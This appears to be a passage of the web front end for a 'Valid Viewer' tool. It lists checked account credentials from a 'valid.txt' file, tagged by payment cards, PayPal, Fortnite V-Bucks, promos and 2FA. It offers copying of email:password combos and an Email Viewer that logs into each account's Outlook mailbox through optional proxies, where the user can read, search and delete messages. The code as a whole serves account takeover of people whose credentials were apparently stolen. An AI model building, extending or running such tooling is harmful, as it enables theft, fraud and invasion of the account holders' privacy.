  .kv-row .v { color: var(--text); font-size: .9rem; word-break: break-word; }
  .tag-row { display: flex; flex-wrap: wrap; gap: 6px; }
  .tag {
    font-size: .72rem; padding: 4px 8px; border-radius: 999px;
    background: rgba(124,92,255,.15); color: #cbbfff; border: 1px solid rgba(124,92,255,.35);
  }
  .tag.green { background: rgba(61,220,151,.12); color: #9af0c8; border-color: rgba(61,220,151,.3); }
  .tag.warn { background: rgba(255,176,32,.12); color: #ffd48a; border-color: rgba(255,176,32,.3); }
  .actions { display: flex; gap: 8px; margin-top: auto; }
  .actions button {
    flex: 1; background: var(--chip); border: 1px solid var(--border);
    font-size: .8rem; padding: 8px;
  }
  .actions button:hover { border-color: var(--accent); }
  .empty {
    text-align: center; color: var(--muted); padding: 60px 20px;
    border: 1px dashed var(--border); border-radius: var(--radius); margin-top: 20px;
  }
  .toast {
    position: fixed; bottom: 20px; right: 20px; background: #1b2230;
    border: 1px solid var(--border); color: var(--text); padding: 12px 16px;
    border-radius: 12px; opacity: 0; transform: translateY(8px);
    transition: .2s ease; z-index: 50; box-shadow: var(--shadow);
  }
  .toast.show { opacity: 1; transform: translateY(0); }
  .meta { color: var(--muted); font-size: .8rem; margin-top: 6px; }
  .mail-modal{position:fixed;inset:0;background:rgba(6,8,14,.78);z-index:50;display:none;align-items:center;justify-content:center;padding:18px}
  .mail-modal.on{display:flex}
  .mail-wrap{width:min(1100px,100%);height:min(820px,92vh);background:#12161f;border:1px solid #2a3344;border-radius:18px;display:flex;flex-direction:column;overflow:visible;box-shadow:0 20px 60px rgba(0,0,0,.45)}
  .mail-head{padding:14px 16px;border-bottom:1px solid #2a3344;display:flex;justify-content:space-between;gap:10px;align-items:center}
  .mail-search{padding:10px 16px;border-bottom:1px solid #2a3344;display:flex;gap:8px}
  .mail-search input{flex:1}
  .mail-folders{display:flex;gap:8px;padding:8px 16px;border-bottom:1px solid #2a3344;flex-wrap:wrap}
  .mail-folder{background:#1b2230;border:1px solid #2a3344;color:#d5def0;border-radius:999px;padding:6px 12px;cursor:pointer}
  .mail-folder.on{background:#3a4d6b;border-color:#8b7cff}
  .mail-toolbar{display:flex;gap:10px;align-items:center;padding:8px 16px;border-bottom:1px solid #2a3344;flex-wrap:wrap}
  .mail-check{display:flex;gap:6px;align-items:center;color:#c9d4e8;font-size:.82rem}
  .mail-body{display:grid;grid-template-columns:240px 320px 1fr;min-height:0;flex:1;overflow:hidden;border-radius:0 0 18px 18px;background:#0c1018}
  .mail-list{overflow:auto;border-right:1px solid #2a3344;padding:10px;background:#0d121b;min-width:0}
  .mail-item{padding:12px 13px;border:1px solid #3a4a63;border-radius:14px;cursor:pointer;margin-bottom:10px;background:#2a3548;overflow:hidden;min-width:0;display:flex;gap:8px;align-items:flex-start}
  .mail-pick{margin-top:8px;flex:0 0 auto}
  .mail-item:hover{border-color:#7c8db0;background:#314058}
  .mail-item.on{background:#3a4d6b;border-color:#8b7cff}
  .tag-green{background:#143528;border-color:#2f8a57;color:#8ef0b5}
  .tag-yellow{background:#3a3214;border-color:#c4a035;color:#f5e08a}
  .tag-blue{background:#1a2c44;border-color:#4d7ec8;color:#9ec5ff}
  .mail-item b{display:block;font-size:.9rem}
  .mail-from{color:#8b97ad;font-size:.76rem;margin-top:6px;display:flex;gap:6px;flex-wrap:wrap;max-width:100%}
  .mail-item b{overflow-wrap:anywhere;word-break:break-word}
  .mail-del-mini{flex:0 0 auto;width:22px;height:22px;border-radius:999px;border:1px solid #4b5563;background:#1f2937;color:#9ca3af;cursor:pointer;line-height:1;font-size:11px;padding:0;display:grid;place-items:center}
  .mail-del-mini:hover{border-color:#f87171;background:#7f1d1d;color:#fecaca}
  .mail-read{overflow:auto;padding:18px 20px;background:#10151f}
  .mail-read-card{background:#2a3548;border:1px solid #3a4a63;border-radius:16px;padding:18px;overflow-wrap:anywhere;word-break:break-word}
  .mail-imgs{display:flex;flex-wrap:wrap;gap:10px;margin-top:14px}
  .mail-imgs img{max-width:100%;max-height:280px;border-radius:10px;border:1px solid #3a4a63;background:#10151f}
  .mail-read h2{margin:0 0 10px;font-size:1.12rem}
  .mail-preview{white-space:pre-wrap;color:#d5dceb;line-height:1.55;margin-top:14px}
  .mail-av{width:32px;height:32px;border-radius:50%;overflow:hidden;flex:0 0 32px;background:#1b2433;border:1px solid #3a4a63;display:grid;place-items:center;position:relative}
  .mail-av img{width:100%;height:100%;object-fit:cover;display:block;position:absolute;inset:0}
  .mail-av-letter{display:grid;place-items:center;width:100%;height:100%}
  .mail-av-lg{width:44px;height:44px;flex-basis:44px}
  .mail-item{display:flex;gap:10px;align-items:flex-start}
  .mail-item-body{min-width:0;flex:1}
  .mail-frame{width:100%;min-height:420px;border:0;border-radius:12px;background:#fff;margin-top:14px}
  .mail-chip{display:inline-flex;align-items:center;border-radius:999px;padding:3px 8px;font-size:.72rem;font-weight:700;max-width:100%;white-space:normal;overflow-wrap:anywhere;word-break:break-all}
  .mail-chip.tag-green{background:#22c55e;border:1px solid #86efac;color:#052e16}
  .mail-chip.tag-yellow{background:#facc15;border:1px solid #fde047;color:#422006}
  .mail-chip.tag-blue{background:#3b82f6;border:1px solid #93c5fd;color:#eff6ff}
  .drop{position:relative;display:inline-block}
  .menu{position:absolute;left:0;top:42px;min-width:280px;background:#0e1320;border:1px solid #2a3344;border-radius:12px;padding:8px;z-index:80;display:none;max-height:240px;overflow:auto}
  .menu.on{display:block}
  .menu div{padding:8px 10px;border-radius:8px;cursor:pointer;display:flex;justify-content:space-between;gap:8px}
  .menu div:hover{background:#1c2330}
  .pager{display:flex;gap:10px;align-items:center;justify-content:center;margin:12px 0}
</style>
</head>
<body>
<header>
  <div class="wrap">
    <div class="title-row">
      <div>
        <h1>Valid Viewer</h1>
        <div class="sub" id="fileMeta">Loading…</div>
      </div>
      <div style="display:flex;gap:8px;flex-wrap:wrap">
        <button class="secondary" id="btnReload" type="button">Reload file</button>
        <button class="secondary" id="btnCopyAll" type="button">Copy filtered emails</button>
      </div>
    </div>
    <div class="controls">
      <input id="q" type="search" placeholder="Search email, password, country, services, promos…"/>
      <select id="tag"><option value="">All tags</option></select>
      <select id="country"><option value="">All countries</option></select>
      <select id="sort">
        <option value="id">File order</option>
        <option value="newest">Newest</option>
        <option value="oldest">Oldest</option>
        <option value="email">Email A–Z</option>
        <option value="email-desc">Email Z–A</option>
        <option value="country">Country</option>
        <option value="line">Line number</option>
      </select>
      <button type="button" id="btnSearch">Filter</button>
      <button class="secondary" type="button" id="btnClear">Clear</button>
    </div>
    <div class="chips" id="quickTags"></div>
  </div>
</header>

<main class="wrap">
  <div class="stats" id="stats">
    <div class="stat"><div class="label">Total valids</div><div class="value" id="stTotal">—</div></div>
    <div class="stat"><div class="label">File size</div><div class="value" id="stSize">—</div></div>
  </div>
  <div class="meta" id="resultMeta"></div>
  <div class="pager" id="accPager"></div>
  <div class="grid" id="grid"></div>
  <div class="empty" id="empty" style="display:none">No accounts match your filters.</div>
</main>
<div class="toast" id="toast"></div>

<div id="mailModal" class="mail-modal">
  <div class="mail-wrap">
    <div class="mail-head">
      <div>
        <div class="muted">EMAIL VIEWER</div>
        <b id="mailTitle"></b>
      </div>
      <button class="secondary" type="button" id="mailClose">Close</button>
    </div>
    <div class="mail-search">
      <input id="mailQ" placeholder="Search mailbox"/>
      <button class="secondary" type="button" id="mailSearchBtn">Search</button>
    </div>
    <div class="mail-folders" id="mailFolders">
      <button type="button" class="mail-folder on" data-folder="inbox">Inbox</button>
      <button type="button" class="mail-folder" data-folder="sent">Sent</button>
      <button type="button" class="mail-folder" data-folder="spam">Spam</button>
      <button type="button" class="mail-folder" data-folder="deleted">Deleted</button>
    </div>
    <div class="mail-toolbar" id="mailToolbar">
      <label class="mail-check"><input type="checkbox" id="mailSelAll"/> Select all</label>
      <button class="secondary" type="button" id="mailBulkDel">Delete selected</button>
      <button class="secondary" type="button" id="mailPurge" style="display:none;background:#7f1d1d;border-color:#f87171;color:#fecaca">Empty deleted</button>
      <span class="muted" id="mailSelCount"></span>
    </div>
    <div class="mail-body">
      <div class="mail-list" id="mailSenders"></div>
      <div class="mail-list" id="mailList">Loading…</div>
      <div class="mail-read" id="mailRead"><div class="muted">Select a message</div></div>
    </div>
  </div>
</div>
<div id="mailDelAsk" class="mail-modal" style="z-index:80">
  <div class="mail-wrap" style="height:auto;width:min(460px,100%)">
    <div class="mail-head"><div><div class="muted">DELETE</div><b>Are you sure?</b></div><button class="secondary" type="button" id="mailDelNo">Close</button></div>
    <div style="padding:18px">
      <p class="muted" id="mailDelText" style="margin:0">Are you sure you want to delete this email?</p>
      <div style="display:flex;gap:10px;margin-top:16px">
        <button type="button" id="mailDelYes" style="background:#7f1d1d;border:1px solid #f87171">Yes</button>
        <button class="secondary" type="button" id="mailDelCancel">No</button>
      </div>
      <div id="mailDelErr" class="muted" style="margin-top:10px"></div>
    </div>
  </div>
</div>
<div id="mailAsk" class="mail-modal">
  <div class="mail-wrap" style="height:auto;width:min(420px,100%)">
    <div class="mail-head"><div><div class="muted">EMAIL VIEWER</div><b>Use proxies?</b></div><button class="secondary" type="button" onclick="$('mailAsk').classList.remove('on')">Close</button></div>
    <div style="padding:18px">
      <p class="muted">Use proxies for this mailbox login?</p>
      <div style="display:flex;gap:10px;margin-top:14px">
        <button type="button" id="mailNoPx">No</button>
        <button class="secondary" type="button" id="mailYesPx">Yes</button>
      </div>
    </div>
  </div>
</div>
<div id="mailPx" class="mail-modal">
  <div class="mail-wrap" style="height:auto;width:min(520px,100%)">
    <div class="mail-head"><div><div class="muted">PROXY SOURCE</div><b id="mailPxTitle">Choose list</b></div><button class="secondary" type="button" onclick="$('mailPx').classList.remove('on')">Close</button></div>
    <div style="padding:16px">
      <div style="display:flex;gap:8px;margin-bottom:12px">
        <button class="secondary" type="button" id="mailPxFile">File</button>
        <button class="secondary" type="button" id="mailPxSrv">Server</button>
      </div>
      <div id="mailPxFileBox">
        <div style="display:flex;gap:8px;flex-wrap:wrap;align-items:center">
          <input id="mailPxPath" placeholder="proxy file" style="min-width:180px;flex:1"/>
          <button class="secondary" type="button" id="mailPxBrowse">Browse</button>
          <button class="secondary" type="button" id="mailPxCheckFile">Check</button>
          <span class="tag" id="mailPxFileCount">0 proxies</span>
        </div>
        <div style="margin-top:10px">
          <button class="secondary" type="button" id="mailPxSavedBtn">Saved lists</button>
          <div id="mailPxSavedMenu" class="menu" style="position:static;margin-top:8px;max-height:180px;width:100%;left:auto;top:auto"></div>
        </div>
      </div>
      <div id="mailPxSrvBox" style="display:none">
        <div id="mailPxUrls"></div>
        <div style="display:flex;gap:8px;margin-top:8px;align-items:center;flex-wrap:wrap">
          <button class="secondary" type="button" id="mailPxAdd">+</button>
          <button class="secondary" type="button" id="mailPxDel" style="display:none">–</button>
          <button class="secondary" type="button" id="mailPxCheck">Check</button>
          <span class="tag" id="mailPxCount">0 proxies</span>
          <div style="width:100%">
            <button class="secondary" type="button" id="mailPxSavedSrvBtn">Saved servers</button>
            <div id="mailPxSavedSrvMenu" class="menu" style="position:static;margin-top:8px;max-height:180px;width:100%;left:auto;top:auto"></div>
          </div>
        </div>
      </div>
      <div style="display:flex;gap:8px;margin-top:14px">
        <button type="button" id="mailPxGo">Continue</button>
        <button class="secondary" type="button" onclick="$('mailPx').classList.remove('on')">Cancel</button>
      </div>
    </div>
  </div>
</div>
<script>
const $ = (id) => document.getElementById(id);
let activeTag = "";

function toast(msg) {
  const el = $("toast");
  el.textContent = msg;
  el.classList.add("show");
  setTimeout(() => el.classList.remove("show"), 1800);
}

function fmtBytes(n) {
  if (n < 1024) return n + " B";
  if (n < 1024*1024) return (n/1024).toFixed(1) + " KB";
  return (n/1024/1024).toFixed(2) + " MB";
}

function tagClass(t) {
  const x = t.toLowerCase();
  if (x.includes("ultimate") || x.includes("game pass") || x.includes("promo") || x.includes("discord")) return "green";
  if (x.includes("no payment") || x.includes("2fa")) return "warn";
  return "";
}


function copyText(text) {
  text = String(text == null ? "" : text);
  if (!text) { toast("Nothing to copy"); return Promise.resolve(false); }
  // Modern API (secure context)
  if (navigator.clipboard && navigator.clipboard.writeText) {
    return navigator.clipboard.writeText(text).then(function() { return true; }).catch(function() {
      return fallbackCopy(text);
    });
  }
  return Promise.resolve(fallbackCopy(text));
}
function fallbackCopy(text) {
  try {
    var ta = document.createElement("textarea");
    ta.value = text;
    ta.setAttribute("readonly", "");
    ta.style.position = "fixed";
    ta.style.top = "-9999px";
    ta.style.left = "0";
    ta.style.opacity = "0";
    document.body.appendChild(ta);
    // iOS
    if (navigator.userAgent.match(/ipad|iphone|ipod/i)) {
      var range = document.createRange();
      range.selectNodeContents(ta);
      var sel = window.getSelection();
      sel.removeAllRanges();
      sel.addRange(range);
      ta.setSelectionRange(0, text.length);
    } else {
      ta.select();
    }
    var ok = document.execCommand("copy");
    document.body.removeChild(ta);
    return ok;
  } catch (e) {
    return false;
  }
}

function esc(s) {
  return String(s == null ? "" : s).replace(/[&<>"']/g, function(c) {
    return ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c];
  });
}

async function loadStats() {
  const res = await fetch("/api/stats");
  const s = await res.json();
  $("stTotal").textContent = s.total ?? 0;
  if ($("stPass")) $("stPass").textContent = s.with_pass ?? 0;
  $("stSize").textContent = fmtBytes(s.file_size || 0);
  $("fileMeta").textContent = (s.file_path || "valid.txt") + " · modified " + (s.modified || "—") + " · loaded " + (s.loaded_at || "—");

  const tagSel = $("tag");
  const curTag = tagSel.value;
  tagSel.innerHTML = '<option value="">All tags</option>';
  const tags = Object.keys(s.tag_counts || {}).sort(function(a,b) { return (s.tag_counts[b]-s.tag_counts[a]); });
  for (const t of tags) {
    const opt = document.createElement("option");
    opt.value = t; opt.textContent = t + " (" + s.tag_counts[t] + ")";
    tagSel.appendChild(opt);
  }
  tagSel.value = curTag;

  const cSel = $("country");
  const curC = cSel.value;
  cSel.innerHTML = '<option value="">All countries</option>';
  const countries = Object.keys(s.countries || {}).sort();
  for (const c of countries) {
    const opt = document.createElement("option");
    opt.value = c; opt.textContent = c + " (" + s.countries[c] + ")";
    cSel.appendChild(opt);
  }
  cSel.value = curC;

  const qt = $("quickTags");
  qt.innerHTML = "";
  const pinned = ["Has Payment","No Payment","PayPal","Fortnite","Promos","Private","Free"];
  const shown = [];
  for (const t of pinned) { if (s.tag_counts && s.tag_counts[t]) shown.push(t); }
  for (const t of tags) { if (shown.indexOf(t) < 0) shown.push(t); }
  for (const t of shown.slice(0, 16)) {
    const chip = document.createElement("span");
    chip.className = "chip" + (activeTag === t ? " active" : "");
    chip.textContent = t + " · " + s.tag_counts[t];
    chip.onclick = function() {
      activeTag = activeTag === t ? "" : t;
      $("tag").value = activeTag;
      window._accPage=1;
      loadAccounts();
      loadStats();
    };
    qt.appendChild(chip);
  }
}

function fieldRows(fields) {
  const preferred = ["Active","Country","Services","Active Cards","Removed Cards","Expires","Fortnite","Specials","Promos","Claimed Promos","Inbox","Keywords","Level","Account Level","V-Bucks","Display","Notes"];
  const keys = Object.keys(fields || {});
  keys.sort(function(a,b) {
    const ia = preferred.findIndex(function(p) { return p.toLowerCase() === a.toLowerCase(); });
    const ib = preferred.findIndex(function(p) { return p.toLowerCase() === b.toLowerCase(); });
    if (ia === -1 && ib === -1) return a.localeCompare(b);
    if (ia === -1) return 1;
    if (ib === -1) return -1;
    return ia - ib;
  });
  return keys.map(function(k) {
    const v = fields[k];
    if (!v) return "";
    return '<div class="kv-row"><div class="k">' + esc(k) + '</div><div class="v">' + esc(v) + '</div></div>';
  }).join("");
}

window._accPage=window._accPage||1;
async function loadAccounts() {
  const q = $("q").value.trim();
  const tag = $("tag").value;
  const country = $("country").value;
  const sort = $("sort").value;
  const params = new URLSearchParams({ q: q, tag: tag, country: country, sort: sort, page: String(window._accPage||1), limit: "24" });
  const res = await fetch("/api/accounts?" + params.toString());
  const data = await res.json();
  const list = data.accounts || [];
  if ($("stShowing")) $("stShowing").textContent = data.count ?? list.length;
  var pages=data.pages||Math.max(1, Math.ceil((data.count||0)/24));
  window._accPage=data.page||1;
  $("resultMeta").textContent = (data.count||list.length) + " account(s) matched";
  function paintPager(id){
    var pg=$(id); if(!pg) return;
    if(pages<=1){ pg.innerHTML=""; return; }
    pg.innerHTML='<button class="secondary" type="button">Back</button><span class="muted">Page '+window._accPage+' / '+pages+'</span><button class="secondary" type="button">Next</button>';
    pg.children[0].onclick=function(){ if(window._accPage>1){ window._accPage--; loadAccounts(); } };
    pg.children[2].onclick=function(){ if(window._accPage<pages){ window._accPage++; loadAccounts(); } };
  }
  paintPager("accPager");
  var extra=$("accPager2"); if(extra) extra.innerHTML="";



  const grid = $("grid");
  const empty = $("empty");
  grid.innerHTML = "";
  if (!list.length) {
    empty.style.display = "block";
    return;
  }
  empty.style.display = "none";

  for (const a of list) {
    const card = document.createElement("article");
    card.className = "card";
    const tags = (a.tags || []).map(function(t) {
      return '<span class="tag ' + tagClass(t) + '">' + esc(t) + '</span>';
    }).join("");
    card.innerHTML =
      '<div class="card-top">' +
        '<div class="email">' + esc(a.email || "(no email)") + '</div>' +
        '<div class="line-no">#' + a.id + ' · L' + a.line + '</div>' +
      '</div>' +
      '<div class="pass"><code>' + esc(a.password || "—") + '</code></div>' +
      '<div class="tag-row">' + tags + '</div>' +
      '<div class="kv">' + fieldRows(a.fields) + '</div>' +
      '<div class="actions">' +
        '<button type="button" data-copy="email">Copy email</button>' +
        '<button type="button" data-copy="combo">Copy combo</button>' +
        '<button type="button" data-copy="raw">Copy line</button>' +
        '<button type="button" data-mail="1">Email Viewer</button>' +
      '</div>';
    card.querySelectorAll("button[data-copy]").forEach(function(btn) {
      btn.addEventListener("click", function() {
        var text = "";
        var kind = btn.getAttribute("data-copy");
        if (kind === "email") text = a.email || "";
        else if (kind === "combo") text = (a.email || "") + ":" + (a.password || "");
        else text = a.raw || "";
        copyText(text).then(function(ok) { toast(ok ? "Copied" : "Copy failed"); });
      });
    });
    card.querySelector("button[data-mail]").addEventListener("click", function(){ openMailViewer(a); });
    grid.appendChild(card);
  }
}

$("btnSearch").onclick = function(){ window._accPage=1; loadAccounts(); };
$("btnClear").onclick = function() {
  $("q").value = "";
  $("tag").value = "";
  $("country").value = "";
  $("sort").value = "id";
  activeTag = "";
  window._accPage=1;
  loadStats();
  loadAccounts();
};
function resetPageAndLoad(){ window._accPage=1; loadAccounts(); }
$("q").addEventListener("keydown", function(e) { if (e.key === "Enter") resetPageAndLoad(); });
$("tag").onchange = resetPageAndLoad;
$("country").onchange = resetPageAndLoad;
$("sort").onchange = resetPageAndLoad;

$("btnReload").onclick = async function() {
  const res = await fetch("/api/reload", { method: "POST" });
  if (!res.ok) { toast("Reload failed"); return; }
  toast("File reloaded");
  await loadStats();
  await loadAccounts();
};

$("btnCopyAll").onclick = async function() {
  const q = $("q").value.trim();
  const tag = $("tag").value;
  const country = $("country").value;
  const sort = $("sort").value;
  const params = new URLSearchParams({ q: q, tag: tag, country: country, sort: sort });
  const res = await fetch("/api/accounts?" + params.toString());
  const data = await res.json();
  const emails = (data.accounts || []).map(function(a) { return a.email; }).filter(Boolean).join("\n");
  copyText(emails).then(function(ok) {
    toast(ok ? ("Copied " + (data.count || 0) + " emails") : "Copy failed");
  });
};


window._mails=[];
window._mailAcc=null;
window._mailFrom=0;
window._mailSel=-1;
function formatMailDate(raw){
  if(!raw) return "";
  var s=String(raw).replace(/(\.\d{3})\d+Z$/,"$1Z");
  var d=new Date(s);
  if(isNaN(d.getTime())) return String(raw);
  var months=["January","February","March","April","May","June","July","August","September","October","November","December"];
  var h=d.getHours(), m=d.getMinutes();
  var am=h<12?"AM":"PM";
  var h12=h%12; if(!h12) h12=12;
  var mm=m<10?"0"+m:String(m);
  return months[d.getMonth()]+" "+d.getDate()+", at "+h12+":"+mm+" "+am;
}
function senderEmailOf(from){
  var raw=String(from||"");
  var em=raw.match(/[A-Z0-9._%+\-]+@[A-Z0-9.\-]+\.[A-Z]{2,}/i);
  return em?em[0].toLowerCase():raw.toLowerCase();
}
function avatarHTML(from, big){
  var key=senderEmailOf(from)||"?";
  var letter=(key.replace(/^[^a-z0-9]+/i,"")[0]||"?").toUpperCase();
  var domain=(key.indexOf("@")>=0)?key.split("@")[1]:"";
  var colors=["#3b82f6","#22c55e","#a855f7","#f59e0b","#ef4444","#06b6d4","#84cc16","#f97316"];
  var n=0; for(var i=0;i<key.length;i++) n=(n+key.charCodeAt(i))%colors.length;
  var src=domain?("https://www.google.com/s2/favicons?sz=128&domain_url="+encodeURIComponent("https://"+domain)) : "";
  var onload="if(this.naturalWidth<=16){this.style.display='none';}else{this.nextSibling.style.display='none';}";
  return '<span class="mail-av'+(big?' mail-av-lg':'')+'" style="background:'+colors[n]+';color:#fff;font-weight:700;font-size:'+(big?'16px':'13px')+'">'+(src?('<img src="'+src+'" alt="" onload="'+onload+'" onerror="this.style.display=\'none\'">'):'')+'<span class="mail-av-letter">'+letter+'</span></span>';
}
function wrapMailHTML(html, preview){
  var raw=html||"";
  if(raw && /<html/i.test(raw)){
    if(!/<meta[^>]+charset/i.test(raw)) raw=raw.replace(/<head[^>]*>/i, function(m){ return m+'<meta charset="utf-8">'; });
    if(!/<base /i.test(raw)) raw=raw.replace(/<head[^>]*>/i, function(m){ return m+'<base target="_blank">'; });
    return raw;
  }
  var body=raw&&raw.indexOf("<")>=0?raw:('<pre style="white-space:pre-wrap;font:14px/1.55 Segoe UI,Arial,sans-serif;margin:0">'+(preview||"").replace(/[&<>]/g,function(c){return ({"&":"&amp;","<":"&lt;",">":"&gt;"})[c];})+'</pre>');
  return '<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><base target="_blank"><style>img,video,iframe{max-width:100%;height:auto}table{max-width:100%}</style></head><body style="margin:0;padding:16px;background:#fff">'+body+'</body></html>';
}
function showMail(i){
  window._mailSel=i;
  var m=activeMailList()[i];
  var pane=$("mailRead");
  if(!m||!pane) return;
  document.querySelectorAll("#mailList .mail-item").forEach(function(el){ el.classList.toggle("on", parseInt(el.getAttribute("data-i"),10)===i); });
  pane.innerHTML='<div class="mail-read-card"><div style="display:flex;justify-content:space-between;gap:10px;align-items:flex-start;flex-wrap:wrap"><div style="display:flex;gap:12px;align-items:flex-start;flex:1;min-width:0">'+avatarHTML(m.from,true)+'<div style="min-width:0"><h2 style="margin:0">'+esc(m.subject||"(no subject)")+'</h2><div class="mail-from" style="margin-top:8px">'+(m.from?('<span class="mail-chip tag-yellow" style="background:#facc15;color:#422006;border:1px solid #fde047">'+esc(displayFromEmail(m.from))+'</span>'):'')+(m.date?('<span class="mail-chip tag-blue" style="background:#3b82f6;color:#eff6ff;border:1px solid #93c5fd">'+esc(formatMailDate(m.date))+'</span>'):'')+'</div></div></div><button type="button" class="secondary" id="mailDelBtn" style="background:#7f1d1d;border-color:#f87171;color:#fecaca">Delete</button></div><iframe class="mail-frame" id="mailFrame" sandbox="allow-scripts allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-presentation allow-forms"></iframe></div>';
  var fr=$("mailFrame");
  if(fr){
    fr.srcdoc=wrapMailHTML(m.html||"", m.preview||"");
    fr.onload=function(){ try{ var d=fr.contentDocument; if(d&&d.body){ fr.style.height=Math.max(520, d.body.scrollHeight+32)+"px"; } }catch(e){} };
  }
  var db=$("mailDelBtn");
  if(db) db.onclick=function(){ deleteMailAt(i); };
  if(m.id && !m._full){
    fetch("/api/mail/body",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({email:(window._mailAcc&&window._mailAcc.email)||"",id:m.id})}).then(function(r){return r.json();}).then(function(d){
      if(!d||!d.ok||!d.html) return;
      if(window._mailSel!==i) return;
      m.html=d.html; m._full=true;
      if(fr) fr.srcdoc=wrapMailHTML(m.html, m.preview||"");
    }).catch(function(){});
  }
}
function closeMailDelAsk(){
  var m=$("mailDelAsk");
  if(m) m.classList.remove("on");
  window._mailDelIdx=-1;
}
function deleteMailAt(i){
  var m=activeMailList()[i];
  if(!m) return;
  window._mailDelIdx=i;
  window._mailDelIds=m.id?[m.id]:[];
  window._mailDelPurge=window._mailFolder==="deleted";
  var t=$("mailDelText");
  if(t) t.textContent="Are you sure you want to delete this email?";
  var err=$("mailDelErr");
  if(err) err.textContent=m.id?"":"This message has no Outlook id, so it cannot be deleted.";
  var yes=$("mailDelYes");
  if(yes){ yes.disabled=!m.id; yes.textContent="Yes"; }
  if($("mailDelAsk")) $("mailDelAsk").classList.add("on");
}
function deletePicked(){
  var ids=Object.keys(window._mailPicked||{}).filter(Boolean);
  if(!ids.length) return;
  window._mailDelIdx=-1;
  window._mailDelIds=ids;
  window._mailDelPurge=window._mailFolder==="deleted";
  var t=$("mailDelText");
  if(t) t.textContent="Are you sure you want to delete these emails?";
  var err=$("mailDelErr"); if(err) err.textContent="";
  var yes=$("mailDelYes"); if(yes){ yes.disabled=false; yes.textContent="Yes"; }
  if($("mailDelAsk")) $("mailDelAsk").classList.add("on");
}
function activeMailList(){
  var f=window._mailFromFilter||"";
  if(!f) return window._mails||[];
  var p=(window._senderPacks||{})[f];
  return (p && p.mails) ? p.mails : [];
}
function removeMailEverywhere(m){
  var k=mailKey(m);
  window._mails=(window._mails||[]).filter(function(x){ return mailKey(x)!==k; });
  Object.keys(window._senderPacks||{}).forEach(function(s){
    var p=window._senderPacks[s];
    if(!p||!p.mails) return;
    p.mails=p.mails.filter(function(x){ return mailKey(x)!==k; });
    if(p.total) p.total=Math.max(0,p.total-1);
  });
}
async function confirmDeleteMail(){
  var ids=window._mailDelIds||[];
  if(!ids.length) return;
  var yes=$("mailDelYes");
  var err=$("mailDelErr");
  if(yes){ yes.disabled=true; yes.textContent="Deleting…"; }
  if(err) err.textContent="";
  try{
    var res=await fetch("/api/mail/delete",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({email:(window._mailAcc&&window._mailAcc.email)||"",ids:ids,purge:!!window._mailDelPurge})});
    var d=await res.json();
    if(!d.ok){
      if(yes){ yes.disabled=false; yes.textContent="Yes"; }
      if(err) err.textContent=d.error||"Could not delete";
      return;
    }
    var set={}; ids.forEach(function(id){ set[id]=true; });
    activeMailList().slice().forEach(function(m){ if(m&&set[m.id]) removeMailEverywhere(m); });
    if(window._mailTotal) window._mailTotal=Math.max(0, window._mailTotal-ids.length);
    window._mailPicked={};
    window._mailSel=-1;
    if($("mailSelAll")) $("mailSelAll").checked=false;
    closeMailDelAsk();
    renderMails();
    if($("mailRead")) $("mailRead").innerHTML='<div class="muted">Deleted</div>';
    if(!activeMailList().length && (window._mailMore || window._mailTotal>0)) loadMailPage(true);
  }catch(e){
    if(yes){ yes.disabled=false; yes.textContent="Yes"; }
    if(err) err.textContent=String(e);
  }
}
function mailKey(m){
  if(!m) return "";
  if(m.id) return "id:"+m.id;
  return String(m.subject||"")+"|"+String(m.from||"")+"|"+String(m.date||"");
}
function displayFromEmail(raw){
  raw=String(raw||"").trim();
  var m=raw.match(/[A-Z0-9._%+\-]+@[A-Z0-9.\-]+\.[A-Z]{2,}/i);
  return m?m[0]:raw;
}
function senderKey(m){
  var raw=String((m&&m.from)||"").trim();
  var em=raw.match(/[A-Z0-9._%+\-]+@[A-Z0-9.\-]+\.[A-Z]{2,}/i);
  if(em) return em[0].toLowerCase();
  return raw.toLowerCase()||"unknown";
}
function mailVisible(){
  var q=(($("mailQ")&&$("mailQ").value)||"").trim().toLowerCase();
  return activeMailList().map(function(m,i){ return {m:m,i:i}; }).filter(function(x){
    if(!q || q==="*") return true;
    var t=((x.m.subject||"")+" "+(x.m.from||"")+" "+(x.m.preview||"")).toLowerCase();
    return t.indexOf(q)>=0;
  });
}
function resetMailState(){
  window._mails=[];
  window._mailFrom=0;
  window._mailSel=-1;
  window._mailFromFilter="";
  window._mailQuery="kind:email";
  window._mailAuthed=false;
  window._mailTotal=0;
  window._mailMore=false;
  window._mailAcc=null;
  window._senderPacks={};
  window._mailFolder="inbox";
  window._mailPicked={};
  if($("mailQ")) $("mailQ").value="";
  if($("mailList")) $("mailList").innerHTML="";
  if($("mailSenders")) $("mailSenders").innerHTML="";
  if($("mailRead")) $("mailRead").innerHTML='<div class="muted">Select a message</div>';
  if($("mailTitle")) $("mailTitle").textContent="";
  if($("mailPxFileCount")) $("mailPxFileCount").textContent="0 proxies";
  if($("mailPxCount")) $("mailPxCount").textContent="0 proxies";
  if($("mailPxPath")) $("mailPxPath").value="";
}
function closeMailMenus(){
  ["mailPxSavedMenu","mailPxSavedSrvMenu"].forEach(function(id){ var m=$(id); if(m) m.classList.remove("on"); });
  window._mailPxMode="file";
  if($("mailPxFileBox")) $("mailPxFileBox").style.display="";
  if($("mailPxSrvBox")) $("mailPxSrvBox").style.display="none";
  if($("mailPxPath")) $("mailPxPath").value="";
  if($("mailPxUrls")) $("mailPxUrls").innerHTML="";
}
function renderMails(append){
  var box=$("mailList"); if(!box) return;
  var rows=mailVisible();
  var senders={};
  (window._mails||[]).forEach(function(m){
    var k=senderKey(m);
    senders[k]=(senders[k]||0)+1;
  });
  var side=$("mailSenders");
  if(side){
    var keys=Object.keys(senders).sort(function(a,b){ return senders[b]-senders[a]; });
    side.innerHTML='<div class="mail-item'+(!window._mailFromFilter?' on':'')+'" data-from=""><div class="mail-item-body"><b>All senders</b><div class="mail-from"><span class="mail-chip tag-green" style="background:#22c55e;color:#052e16;border:1px solid #86efac">Total messages: '+(window._mailTotal|| (window._mails||[]).length)+'</span><span class="mail-chip tag-green" style="background:#22c55e;color:#052e16;border:1px solid #86efac">'+keys.length+' senders</span></div></div></div>'+keys.map(function(k){
      var cnt=(window._senderPacks[k]&&window._senderPacks[k].total)?window._senderPacks[k].total:senders[k];
